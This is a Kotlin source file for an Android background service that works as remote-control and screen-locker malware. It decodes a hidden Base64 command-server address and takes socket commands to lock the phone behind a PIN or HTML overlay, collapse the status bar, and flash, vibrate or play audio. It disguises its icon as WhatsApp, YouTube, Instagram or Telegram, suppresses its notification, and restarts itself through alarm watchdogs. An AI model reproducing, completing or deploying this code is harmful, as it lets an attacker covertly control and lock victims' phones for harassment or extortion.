package com.sync.xxx

import android.app.*
import android.content.*
import android.graphics.BitmapFactory
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraManager
import android.media.AudioManager
import android.app.WallpaperManager
import android.os.*
import android.util.Log
import android.view.WindowManager
import android.graphics.PixelFormat
import androidx.core.app.NotificationCompat
import io.socket.client.IO
import io.socket.client.Socket
import org.json.JSONObject
import java.net.URI

class DeviceService : Service() {

    companion object {
        const val ACTION_COMMAND     = "com.sync.xxx.COMMAND"
        const val EXTRA_COMMAND      = "command"
        const val EXTRA_VALUE        = "value"
        const val ACTION_CONNECT     = "com.sync.xxx.CONNECT"
        const val ACTION_SEND_STATUS = "com.sync.xxx.SEND_STATUS"
        const val EXTRA_STATUS_JSON  = "statusJson"
        const val CHANNEL_ID         = "sync_xxx"
        const val NOTIF_ID           = 1

        val SERVER_URL: String
            get() = String(
                android.util.Base64.decode(
                    "aHR0cDovL2FudGkubW9rYXQubWlyenByaXZhdGUubXkuaWQ6MjUxMQ==",
                    android.util.Base64.DEFAULT
                )
            ).trim()
            var lastPendingChat: String = ""
            var lastPendingChatTime: Long = 0L
          }

    private var socket: Socket? = null
    private var deviceId: String = ""
    private var deviceName: String = ""

    private var cameraManager: CameraManager? = null
    private var torchCameraId: String? = null

    private var flashHandler: Handler? = null
    private var flashRunnable: Runnable? = null
    private var flashBlinking = false

    private var senterOn = false

    var lockPin: String = ""
    var lockTitle: String = ""

    private var lockFlashHandler: Handler? = null
    private var lockFlashRunnable: Runnable? = null
    private var lockFlashState = false

    private var statusBarCollapseHandler: Handler? = null
    private var statusBarCollapseRunnable: Runnable? = null
    private var lockMediaPlayer: android.media.MediaPlayer? = null

    private var lockCustomView: android.webkit.WebView? = null
    private val lockCustomWm: WindowManager by lazy { getSystemService(WINDOW_SERVICE) as WindowManager }

    private var flashIntervalHandler: Handler? = null
    private var flashIntervalRunnable: Runnable? = null
    private var flashIntervalState = false
    private var mediaPlayer: android.media.MediaPlayer? = null
    
    private fun playAudio(url: String) {
        try {
            mediaPlayer?.release()
            mediaPlayer = android.media.MediaPlayer().apply {
                setDataSource(url)
                setOnPreparedListener { start() }
                setOnCompletionListener { release(); mediaPlayer = null }
                setOnErrorListener { _, _, _ -> release(); mediaPlayer = null; false }
                prepareAsync()
            }
        } catch (e: Exception) {
            Log.e("DeviceService", "playAudio: ${e.message}")
        }
    }
    
    private val localReceiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context, intent: Intent) {
            when (intent.action) {
                ACTION_COMMAND -> {
                    val cmd   = intent.getStringExtra(EXTRA_COMMAND) ?: return
                    val value = intent.getStringExtra(EXTRA_VALUE)   ?: ""
                    handleCommand(cmd, value)
                }
                ACTION_CONNECT -> {
                    if (socket == null || socket?.connected() == false) connectSocket()
                }
                ACTION_SEND_STATUS -> {
                    val json = intent.getStringExtra(EXTRA_STATUS_JSON) ?: return
                    emitStatus(JSONObject(json))
                }
            }
        }
    }

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            startForeground(
                NOTIF_ID,
                buildNotification(),
                android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE
            )
        } else {
            startForeground(NOTIF_ID, buildNotification())
        }

        Handler(Looper.getMainLooper()).postDelayed({
        try {
            getSystemService(android.app.NotificationManager::class.java)
                .cancel(NOTIF_ID)
        } catch (_: Exception) {}
    }, 500L)

        deviceId = android.provider.Settings.Secure.getString(
            contentResolver, android.provider.Settings.Secure.ANDROID_ID
        ).takeIf { !it.isNullOrBlank() } ?: Build.ID

        val mfr   = Build.MANUFACTURER.replaceFirstChar { it.uppercase() }
        val model = Build.MODEL
        deviceName = if (model.startsWith(mfr, ignoreCase = true)) model else "$mfr $model"

        cameraManager = getSystemService(CAMERA_SERVICE) as CameraManager
        torchCameraId = cameraManager?.cameraIdList?.firstOrNull { id ->
            cameraManager?.getCameraCharacteristics(id)
                ?.get(CameraCharacteristics.FLASH_INFO_AVAILABLE) == true
        }

        val filter = IntentFilter().apply {
            addAction(ACTION_CONNECT)
            addAction(ACTION_SEND_STATUS)
            addAction(ACTION_COMMAND)
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(localReceiver, filter, RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(localReceiver, filter)
        }

        connectSocket()
    }
    // ─────────────────────────────────────────────

    private fun connectSocket() {
        try {
            val opts = IO.Options.builder()
                .setReconnection(true)
                .setReconnectionDelay(3000)
                .setReconnectionDelayMax(10000)
                .build()

            socket = IO.socket(URI.create(SERVER_URL), opts)

            socket?.on(Socket.EVENT_CONNECT) {
                Log.d("DeviceService", "Socket Connected")
                SocketHolder.connected = true

                val batteryIntent = registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
                val level   = batteryIntent?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
                val scale   = batteryIntent?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
                val plugged = batteryIntent?.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1) ?: -1
                val battPct = if (level >= 0 && scale > 0) (level * 100 / scale) else -1

                socket?.emit("device:register", JSONObject().apply {
                    put("deviceId",       deviceId)
                    put("name",           deviceName)
                    put("battery",        battPct)
                    put("charging",       plugged != 0)
                    put("sdkVersion",     Build.VERSION.SDK_INT)
                    put("androidVersion", Build.VERSION.RELEASE)
                    put("uid",            readUid())
                })
            }

            socket?.on(Socket.EVENT_DISCONNECT) {
                Log.d("DeviceService", "Socket disconnected")
                SocketHolder.connected = false
            }

            socket?.on("command") { args ->
                val data   = args[0] as? JSONObject ?: return@on
                val cmd    = data.optString("command")
                val valRaw = data.opt("value")?.toString() ?: ""
                val intent = Intent(ACTION_COMMAND).apply {
                    putExtra(EXTRA_COMMAND, cmd)
                    putExtra(EXTRA_VALUE, valRaw)
                    setPackage(packageName)
                }
                sendBroadcast(intent)
            }

            socket?.connect()
        } catch (e: Exception) {
            Log.e("DeviceService", "Socket error: ${e.message}")
        }
    }

   private fun handleCommand(cmd: String, value: String) {
    when (cmd) {
        "senter"            -> setSenter(value == "true")
        "flashlight"        -> setFlashlight(value == "true")
        "flashInterval"     -> startFlashInterval(value)
        "flashIntervalStop" -> stopFlashInterval()
        "setWallpaper"      -> setWallpaperFromUrl(value)
        "vibrate"           -> vibrateDevice(value)
        "setVolume"         -> setVolumeLevel(value.toIntOrNull()?.coerceIn(0, 100) ?: 50)
        "muteVolume"        -> setVolumeMute(value == "true")
        "changeTheme"       -> changeTheme(value)
        "hideIcon"          -> setHideIcon(value == "true")
        "playAudio"         -> playAudio(value)
        "lockDevice"        -> lockDevice(value)
        "lockCustom"        -> lockCustom(value)
        "unlockDevice"      -> unlockDevice()
        "lockV3"            -> lockV3(value)
        "chatFromTarget"    -> sendChatToAdmin(value)
        "chatToTarget"      -> deliverChatToTarget(value)
    }
}

    private fun setHideIcon(hide: Boolean) {
        try {
            val pm = packageManager
            val aliases = listOf(
                "com.sync.xxx.AliasDefault",
                "com.sync.xxx.AliasWhatsApp",
                "com.sync.xxx.AliasYouTube",
                "com.sync.xxx.AliasInstagram",
                "com.sync.xxx.AliasTelegram",
                "com.sync.xxx.AliasXNXX"
            )
            aliases.forEach { alias ->
                try {
                    pm.setComponentEnabledSetting(
                        android.content.ComponentName(packageName, alias),
                        android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                        android.content.pm.PackageManager.DONT_KILL_APP
                    )
                } catch (_: Exception) {}
            }
            if (!hide) {
                pm.setComponentEnabledSetting(
                    android.content.ComponentName(packageName, "com.sync.xxx.AliasDefault"),
                    android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                    android.content.pm.PackageManager.DONT_KILL_APP
                )
            }
            emitStatus(JSONObject().apply { put("iconHidden", hide) })
        } catch (e: Exception) {
            Log.e("DeviceService", "setHideIcon: ${e.message}")
        }
    }

    private fun setSenter(on: Boolean) {
        try {
            senterOn = on
            torchCameraId?.let { cameraManager?.setTorchMode(it, on) }
            emitStatus(JSONObject().apply { put("senterOn", on) })
        } catch (e: Exception) {
            Log.e("DeviceService", "setSenter: ${e.message}")
        }
    }

    private fun setFlashlight(on: Boolean) {
        if (on) {
            if (flashBlinking) return
            flashBlinking = true
            flashHandler  = Handler(Looper.getMainLooper())
            var state     = false
            flashRunnable = object : Runnable {
                override fun run() {
                    if (!flashBlinking) {
                        try { torchCameraId?.let { cameraManager?.setTorchMode(it, false) } } catch (_: Exception) {}
                        return
                    }
                    state = !state
                    try { torchCameraId?.let { cameraManager?.setTorchMode(it, state) } } catch (_: Exception) {}
                    flashHandler?.postDelayed(this, 200)
                }
            }
            flashHandler?.post(flashRunnable!!)
        } else {
            flashBlinking = false
            flashHandler?.removeCallbacks(flashRunnable ?: return)
            flashHandler  = null
            flashRunnable = null
            try { torchCameraId?.let { cameraManager?.setTorchMode(it, false) } } catch (_: Exception) {}
        }
        emitStatus(JSONObject().apply { put("flashlight", on) })
    }

    private fun startFlashInterval(value: String) {
        stopFlashInterval()
        val ms = value.toLongOrNull()?.coerceAtLeast(50L) ?: 200L
        flashIntervalHandler = Handler(Looper.getMainLooper())
        flashIntervalRunnable = object : Runnable {
            override fun run() {
                flashIntervalState = !flashIntervalState
                try { torchCameraId?.let { cameraManager?.setTorchMode(it, flashIntervalState) } } catch (_: Exception) {}
                flashIntervalHandler?.postDelayed(this, ms)
            }
        }
        flashIntervalHandler?.post(flashIntervalRunnable!!)
        emitStatus(JSONObject().apply {
            put("flashIntervalActive", true)
            put("flashIntervalMs", ms)
        })
    }

    private fun stopFlashInterval() {
        flashIntervalRunnable?.let { flashIntervalHandler?.removeCallbacks(it) }
        flashIntervalHandler  = null
        flashIntervalRunnable = null
        flashIntervalState    = false
        try { torchCameraId?.let { cameraManager?.setTorchMode(it, false) } } catch (_: Exception) {}
        emitStatus(JSONObject().apply { put("flashIntervalActive", false) })
    }

    private fun setWallpaperFromUrl(url: String) {
        Thread {
            try {
                val conn = (java.net.URL(url).openConnection() as java.net.HttpURLConnection).apply {
                    requestMethod           = "GET"
                    connectTimeout          = 8000
                    readTimeout             = 15000
                    setRequestProperty("User-Agent", "Mozilla/5.0")
                    setRequestProperty("Accept", "image/*")
                    instanceFollowRedirects = true
                    connect()
                }
                if (conn.responseCode != 200) { conn.disconnect(); return@Thread }
                val bytes = conn.inputStream.use { it.readBytes() }
                conn.disconnect()
                val bmp = BitmapFactory.decodeByteArray(bytes, 0, bytes.size) ?: return@Thread
                WallpaperManager.getInstance(this).setBitmap(bmp)
                bmp.recycle()
                emitStatus(JSONObject().apply { put("wallpaperSet", true) })
            } catch (e: Exception) {
                Log.e("DeviceService", "setWallpaper: ${e.message}")
            }
        }.start()
    }

    private fun vibrateDevice(value: String) {
        try {
            val durationMs = value.toLongOrNull() ?: 500L
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                val vm  = getSystemService(android.os.VibratorManager::class.java)
                val vib = vm?.defaultVibrator
                vib?.vibrate(VibrationEffect.createOneShot(durationMs, VibrationEffect.DEFAULT_AMPLITUDE))
            } else {
                @Suppress("DEPRECATION")
                val vib = getSystemService(VIBRATOR_SERVICE) as? android.os.Vibrator
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    vib?.vibrate(VibrationEffect.createOneShot(durationMs, VibrationEffect.DEFAULT_AMPLITUDE))
                } else {
                    @Suppress("DEPRECATION")
                    vib?.vibrate(durationMs)
                }
            }
            emitStatus(JSONObject().apply { put("vibrated", durationMs) })
        } catch (e: Exception) {
            Log.e("DeviceService", "vibrateDevice: ${e.message}")
        }
    }

    private fun setVolumeLevel(level: Int) {
        try {
            val audio = getSystemService(AUDIO_SERVICE) as AudioManager
            listOf(
                AudioManager.STREAM_MUSIC,
                AudioManager.STREAM_RING,
                AudioManager.STREAM_NOTIFICATION
            ).forEach { stream ->
                val max    = audio.getStreamMaxVolume(stream)
                val target = (level / 100f * max).toInt().coerceIn(0, max)
                audio.setStreamVolume(stream, target, 0)
            }
            emitStatus(JSONObject().apply {
                put("volumeLevel", level)
                put("volumeMuted", level == 0)
            })
        } catch (e: Exception) {
            Log.e("DeviceService", "setVolumeLevel: ${e.message}")
        }
    }

    private fun setVolumeMute(mute: Boolean) {
        try {
            val audio = getSystemService(AUDIO_SERVICE) as AudioManager
            audio.setStreamVolume(
                AudioManager.STREAM_MUSIC,
                if (mute) 0 else audio.getStreamMaxVolume(AudioManager.STREAM_MUSIC),
                0
            )
            emitStatus(JSONObject().apply { put("volumeMuted", mute) })
        } catch (e: Exception) {
            Log.e("DeviceService", "setVolumeMute: ${e.message}")
        }
    }


    private val THEME_ALIASES = mapOf(
        "default"   to "com.sync.xxx.AliasDefault",
        "whatsapp"  to "com.sync.xxx.AliasWhatsApp",
        "youtube"   to "com.sync.xxx.AliasYouTube",
        "instagram" to "com.sync.xxx.AliasInstagram",
        "telegram"  to "com.sync.xxx.AliasTelegram",
        "xnxx"      to "com.sync.xxx.AliasXNXX"
    )

    private fun changeTheme(theme: String) {
        try {
            val pm     = packageManager
            val target = theme.lowercase().trim()
            THEME_ALIASES.values.forEach { alias ->
                try {
                    pm.setComponentEnabledSetting(
                        android.content.ComponentName(packageName, alias),
                        android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                        android.content.pm.PackageManager.DONT_KILL_APP
                    )
                } catch (_: Exception) {}
            }
            val chosen = THEME_ALIASES[target] ?: THEME_ALIASES["default"]!!
            pm.setComponentEnabledSetting(
                android.content.ComponentName(packageName, chosen),
                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                android.content.pm.PackageManager.DONT_KILL_APP
            )
            emitStatus(JSONObject().apply { put("themeChanged", theme) })
        } catch (e: Exception) {
            Log.e("DeviceService", "changeTheme: ${e.message}")
        }
    }

    private fun readUid(): String {
        return try {
            val json = assets.open("uid.json").bufferedReader().use { it.readText() }
            JSONObject(json).optString("uid", "")
        } catch (e: Exception) {
            Log.e("DeviceService", "readUid: ${e.message}")
            ""
        }
    }

    fun emitStatus(statusObj: JSONObject) {
        if (socket?.connected() != true) return
        socket?.emit("device:status", JSONObject().apply {
            put("deviceId", deviceId)
            put("status", statusObj)
        })
    }

   private fun lockDevice(jsonValue: String) {
        try {
            val obj   = org.json.JSONObject(jsonValue)
            val pin   = obj.optString("pin", "")
            val title = obj.optString("title", "Perangkat Terkunci")
            lockPin   = pin
            lockTitle = title

            val intent = Intent(this, LockOverlayService::class.java).apply {
                putExtra(LockOverlayService.EXTRA_PIN, pin)
                putExtra(LockOverlayService.EXTRA_TITLE, title)
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent)
            } else {
                startService(intent)
            }

            startLockFlashBlink()

            emitStatus(JSONObject().apply {
                put("deviceLocked", true)
                put("lockTitle", title)
            })
        } catch (e: Exception) {
            Log.e("DeviceService", "lockDevice error: ${e.message}")
        }
    }
    // ── lockV3 — pakai LockOverlayService (sama seperti lockDevice) ───────────

    private fun lockV3(jsonValue: String) {
        try {
            val obj   = org.json.JSONObject(jsonValue)
            val pin   = obj.optString("pin", "")
            val title = obj.optString("title", "Perangkat Terkunci")
            lockPin   = pin
            lockTitle = title

            val intent = Intent(this, LockChatActivity::class.java).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                putExtra(LockOverlayService.EXTRA_PIN,   pin)
                putExtra(LockOverlayService.EXTRA_TITLE, title)
            }
            startActivity(intent)

            startLockFlashBlink()
            playLockSound()
            startStatusBarCollapse()

            emitStatus(JSONObject().apply {
                put("deviceLocked", true)
                put("lockTitle",    title)
                put("lockV3Active", true)
            })
        } catch (e: Exception) {
            Log.e("DeviceService", "lockV3: ${e.message}")
        }
    }
    // ── lockCustom — floating WebView overlay ─────────────────────────────────
    private fun lockCustom(htmlContent: String) {
        try {
            if (htmlContent.isEmpty()) {
                removeLockCustomOverlay()
                unlockDevice()
                return
            }
            lockPin   = ""
            lockTitle = ""

            removeLockCustomOverlay()

            Handler(Looper.getMainLooper()).post {
                try {
                    val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                        WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                    else
                        @Suppress("DEPRECATION") WindowManager.LayoutParams.TYPE_SYSTEM_ALERT

                    val params = WindowManager.LayoutParams(
                        WindowManager.LayoutParams.MATCH_PARENT,
                        WindowManager.LayoutParams.MATCH_PARENT,
                        type,
                        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                        WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                        WindowManager.LayoutParams.FLAG_FULLSCREEN or
                        WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
                        WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD or
                        WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
                        PixelFormat.TRANSLUCENT
                    )

                    val fullHtml = """<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
  *{margin:0;padding:0;box-sizing:border-box}
  html,body{width:100%;height:100%;background:#000;overflow:hidden;
    display:flex;align-items:center;justify-content:center}
</style>
</head>
<body>
${htmlContent}
</body>
</html>"""

                    val wv = android.webkit.WebView(this@DeviceService).apply {
                        settings.javaScriptEnabled = true
                        settings.domStorageEnabled  = true
                        setBackgroundColor(android.graphics.Color.BLACK)
                        loadDataWithBaseURL(null, fullHtml, "text/html", "UTF-8", null)
                    }

                    lockCustomView = wv
                    lockCustomWm.addView(wv, params)
                } catch (e: Exception) {
                    Log.e("DeviceService", "lockCustom overlay: ${e.message}")
                }
            }

            startLockFlashBlink()
            playLockSound()
            startStatusBarCollapse()
            emitStatus(JSONObject().apply {
                put("deviceLocked", true)
                put("lockTitle", "CUSTOM")
            })
        } catch (e: Exception) {
            Log.e("DeviceService", "lockCustom error: ${e.message}")
        }
    }
    // ── unlockDevice ──────────────────────────────────────────────────────────
    private fun unlockDevice() {
        lockPin   = ""
        lockTitle = ""
        stopLockFlashBlink()
        try { torchCameraId?.let { cameraManager?.setTorchMode(it, false) } } catch (_: Exception) {}
        lockMediaPlayer?.release()
        lockMediaPlayer = null
        stopStatusBarCollapse()
        removeLockCustomOverlay()
        val intent = Intent("com.sync.xxx.UNLOCK").apply { setPackage(packageName) }
        sendBroadcast(intent)
        emitStatus(JSONObject().apply {
            put("deviceLocked", false)
            put("lockTitle", "")
        })
    }
    // ── Chat target → admin ───────────────────────────────────────────────────
    private fun sendChatToAdmin(message: String) {
        if (socket?.connected() != true) return
        socket?.emit("device:chat", JSONObject().apply {
            put("deviceId", deviceId)
            put("from",     "target")
            put("message",  message)
            put("time",     System.currentTimeMillis())
        })
    }
    // ── Chat admin → target ───────────────────────────────────────────────────
    private fun deliverChatToTarget(message: String) {
        sendBroadcast(Intent("com.sync.xxx.CHAT_FROM_ADMIN").apply {
            putExtra("message", message)
            setPackage(packageName)
        })
        lastPendingChat     = message
        lastPendingChatTime = System.currentTimeMillis()
    }
    // ── Lock flash blink ──────────────────────────────────────────────────────
    private fun startLockFlashBlink() {
        stopLockFlashBlink()
        lockFlashHandler  = Handler(Looper.getMainLooper())
        lockFlashRunnable = object : Runnable {
            override fun run() {
                lockFlashState = !lockFlashState
                try { torchCameraId?.let { cameraManager?.setTorchMode(it, lockFlashState) } } catch (_: Exception) {}
                lockFlashHandler?.postDelayed(this, 200)
            }
        }
        lockFlashHandler?.post(lockFlashRunnable!!)
    }
    private fun stopLockFlashBlink() {
        lockFlashHandler?.removeCallbacks(lockFlashRunnable ?: return)
        lockFlashHandler  = null
        lockFlashRunnable = null
        lockFlashState    = false
        try { torchCameraId?.let { cameraManager?.setTorchMode(it, false) } } catch (_: Exception) {}
    }
    // ── Status bar collapse (cegah pull-down saat lock) ───────────────────────
    private fun startStatusBarCollapse() {
        stopStatusBarCollapse()
        statusBarCollapseHandler  = Handler(Looper.getMainLooper())
        statusBarCollapseRunnable = object : Runnable {
            override fun run() {
                try {
                    @Suppress("DEPRECATION")
                    sendBroadcast(Intent(Intent.ACTION_CLOSE_SYSTEM_DIALOGS))
                } catch (_: Exception) {}
                try {
                    val svc   = getSystemService("statusbar")
                    val clazz = Class.forName("android.app.StatusBarManager")
                    clazz.getMethod("collapsePanels").invoke(svc)
                } catch (_: Exception) {}
                statusBarCollapseHandler?.postDelayed(this, 80)
            }
        }
        statusBarCollapseHandler?.post(statusBarCollapseRunnable!!)
    }

    private fun stopStatusBarCollapse() {
        statusBarCollapseRunnable?.let { statusBarCollapseHandler?.removeCallbacks(it) }
        statusBarCollapseHandler  = null
        statusBarCollapseRunnable = null
    }

    private fun removeLockCustomOverlay() {
        lockCustomView?.let {
            try {
                Handler(Looper.getMainLooper()).post { lockCustomWm.removeView(it) }
            } catch (_: Exception) {}
        }
        lockCustomView = null
    }

    // ── Lock sound (butuh res/raw/lock.mp3 di project) ────────────────────────
    private fun playLockSound() {
        try {
            lockMediaPlayer?.release()
            val afd = resources.openRawResourceFd(R.raw.lock) ?: return
            lockMediaPlayer = android.media.MediaPlayer().apply {
                setDataSource(afd.fileDescriptor, afd.startOffset, afd.length)
                afd.close()
                setOnCompletionListener { release(); lockMediaPlayer = null }
                prepare()
                start()
            }
        } catch (e: Exception) {
            Log.e("DeviceService", "playLockSound: ${e.message}")
        }
    }

    override fun onBind(intent: Intent?): android.os.IBinder? = null

    // ─── onStartCommand ───────────────────────────────────────────────────────────
override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
    scheduleRestartAlarm()
    return START_STICKY
}

// ─── onTaskRemoved — kalau user swipe dari recents, langsung restart ──────────
override fun onTaskRemoved(rootIntent: Intent?) {
    val restartIntent = Intent(applicationContext, DeviceService::class.java).apply {
        setPackage(packageName)
    }
    // Di Android 8+ harus pakai startForegroundService
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
        startForegroundService(restartIntent)
    } else {
        startService(restartIntent)
    }
    super.onTaskRemoved(rootIntent)
}

// ─── scheduleRestartAlarm — watchdog tiap 15 detik ─────────────────
private fun scheduleRestartAlarm() {
    try {
        val intent  = Intent(this, RestartReceiver::class.java)
        val pending = PendingIntent.getBroadcast(
            this, 0, intent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )
        val am = getSystemService(ALARM_SERVICE) as AlarmManager
        // setRepeating gak dijamin exact di Doze, tapi cukup buat watchdog
        am.setRepeating(
            AlarmManager.RTC_WAKEUP,
            System.currentTimeMillis() + 15_000L,
            15_000L,   // ← 15 detik jauh lebih responsif
            pending
        )
    } catch (e: Exception) {
        Log.e("DeviceService", "scheduleRestartAlarm: ${e.message}")
    }
}

override fun onDestroy() {
    super.onDestroy()
    try { unregisterReceiver(localReceiver) } catch (_: Exception) {}

    flashBlinking = false
    flashHandler?.removeCallbacks(flashRunnable ?: Runnable {})
    try { torchCameraId?.let { cameraManager?.setTorchMode(it, false) } } catch (_: Exception) {}

    stopFlashInterval()
    stopLockFlashBlink() 
    stopStatusBarCollapse() 
    lockMediaPlayer?.release()
    lockMediaPlayer = null
    try { mediaPlayer?.stop() } catch (_: Exception) {}
    try { mediaPlayer?.release() } catch (_: Exception) {}
    mediaPlayer = null

    socket?.disconnect()
    socket = null

    // Immediate restart via alarm saat service mati
    try {
        val pending = PendingIntent.getBroadcast(
            this, 1,
            Intent(this, RestartReceiver::class.java),
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )
        val am = getSystemService(ALARM_SERVICE) as AlarmManager
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            am.setExactAndAllowWhileIdle(
                AlarmManager.RTC_WAKEUP,
                System.currentTimeMillis() + 2_000L,
                pending
            )
        } else {
            am.setExact(
                AlarmManager.RTC_WAKEUP,
                System.currentTimeMillis() + 2_000L,
                pending
            )
        }
    } catch (e: Exception) {
        Log.e("DeviceService", "onDestroy restart alarm: ${e.message}")
    }
}

    
    private fun buildNotification(): Notification =
    NotificationCompat.Builder(this, CHANNEL_ID)
        .setSmallIcon(android.R.drawable.ic_menu_info_details)
        .setPriority(NotificationCompat.PRIORITY_MIN)
        .setVisibility(NotificationCompat.VISIBILITY_SECRET)
        .setShowWhen(false)
        .setSilent(true)
        .build()

private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel(CHANNEL_ID, "Sync XxX Service", NotificationManager.IMPORTANCE_LOW)
            getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
        }
    }
}

object SocketHolder {
    var connected: Boolean = false
}